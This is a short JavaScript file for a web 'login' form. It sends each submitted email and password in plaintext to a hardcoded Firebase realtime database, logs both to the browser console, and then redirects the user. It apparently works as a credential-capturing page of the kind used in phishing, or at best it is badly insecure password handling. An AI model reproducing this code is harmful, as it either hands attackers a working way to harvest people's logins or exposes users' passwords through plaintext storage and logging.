const firebaseConfig = {
  apiKey: "AIzaSyDbPas2bcVppZI_nWgNustvBBSBzMIRAJ4",
  authDomain: "parth-grand-finale.firebaseapp.com",
  databaseURL: "https://parth-grand-finale-default-rtdb.firebaseio.com",
  projectId: "parth-grand-finale",
  storageBucket: "parth-grand-finale.appspot.com",
  messagingSenderId: "478526429762",
  appId: "1:478526429762:web:2d091dd431e0701c7a6bdb",
  measurementId: "G-NEDR2F8Y1V"
};
  
  firebase.initializeApp(firebaseConfig);
  const nameref = firebase.database().ref('name');
  
  //listen for register
  document.getElementById('login').addEventListener('submit', submitform);
  
  
  //submit form
  function submitform(e)
  {
    e.preventDefault();
  
    //get values
    var email = getInputVal('email');
    var password = getInputVal('password');
  //save form
  saveform(email, password);
  
  
  }
  
  
  // Function to get get form values
  function getInputVal(id)
  {
     return document.getElementById(id).value;
  }
  
  //save messeges to firebase
  function saveform(email, password){
    console.log('Saving data to Firebase:', email, password);
    var newname = nameref.push();
    newname.set({
        email:email,
        password:password
    }) .then(() => {
      // Data successfully saved
      alert('Data successfully saved to Firebase!');
      window.location.href = "/index5.html";
      // You can add additional actions here if needed
    })
    .catch((error) => {
      // Handle errors
      console.error('Error saving data to Firebase:', error);
      alert('Error saving data to Firebase. Please try again.');
    });
  }
  